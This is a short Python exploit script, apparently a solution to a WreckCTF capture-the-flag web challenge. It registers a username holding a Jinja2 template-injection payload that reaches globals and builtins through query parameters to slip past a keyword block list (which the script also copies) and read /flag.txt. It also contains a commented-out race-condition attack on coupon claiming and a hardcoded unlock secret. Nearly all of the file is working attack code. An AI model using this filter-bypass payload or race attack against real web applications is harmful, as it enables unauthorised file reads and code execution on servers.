import requests,threading,time
url='https://race-to-the-flag-5xbyh.challs.wreckctf.com/'
username='{{lipsum[request.args.a][request.args.b]["open"]("/flag.txt").read()}}'
http=requests.post(url+'register',data={"username":username},allow_redirects=False)
cookie=http.headers['Set-Cookie']
session=cookie[cookie.find('=')+1:cookie.find(';')]
print(cookie,session)
BLOCKED_KEYWORDS = [
    "os", "popen", "system", "subprocess", "import", "eval",
    "exec", "builtins", "globals", "getattr", "class", "mro",
    "subclasses", "config",
]
def is_blocked(text):
    if "_" in text:
        return True
    lower = text.lower()
    for kw in BLOCKED_KEYWORDS:
        if kw in lower:
            print(kw)
            return True
    return False
def claim():
    http=requests.post(url+'claim-coupon',cookies={"session":session},allow_redirects=False)
    print(http.text,time.time())
#thread1=threading.Thread(target=claim,daemon=True)
#thread2=threading.Thread(target=claim,daemon=True)
#thread1.start()
#thread2.start()
#time.sleep(2)
#http=requests.post(url+'buy',cookies={"session":session},allow_redirects=True)
#a=http.text
#a=a.replace('true','True')
#secret=eval(a)['secret']
#print(secret)
secret='FL4G_UNLOCK_7fdb5bbd3bcc6c11a14ecf5ad9905641'
http=requests.get(url+'receipt?a=__globals__&b=__builtins__&secret='+secret,cookies={"session":session},allow_redirects=True)
print(http.text)
print(is_blocked(username))
